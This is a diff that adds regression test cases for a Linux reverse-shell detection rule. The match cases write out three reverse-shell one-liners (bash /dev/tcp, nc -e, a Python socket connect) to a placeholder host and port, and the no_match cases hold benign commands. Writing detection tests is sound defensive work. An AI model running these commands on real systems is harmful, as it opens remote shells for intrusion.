@@ -1,0 +1,29 @@
+# Regression cases for aegis-lnx-reverse-shell. Events are completed with defaults by the test runner.
+rule: aegis-lnx-reverse-shell
+match:
+- process:
+    pid: 2
+    name: bash
+    executable: /bin/bash
+    command_line: bash -i >& /dev/tcp/198.51.100.23/4444 0>&1
+- process:
+    pid: 2
+    name: nc
+    executable: /usr/bin/nc
+    command_line: nc -e /bin/sh 198.51.100.23 4444
+- process:
+    pid: 2
+    name: python3
+    executable: /usr/bin/python3
+    command_line: python3 -c 'import socket,subprocess;s=socket.socket();s.connect(("198.51.100.23",4444))'
+no_match:
+- process:
+    pid: 2
+    name: nc
+    executable: /usr/bin/nc
+    command_line: nc -zv 10.0.0.1 22
+- process:
+    pid: 2
+    name: bash
+    executable: /bin/bash
+    command_line: bash -i
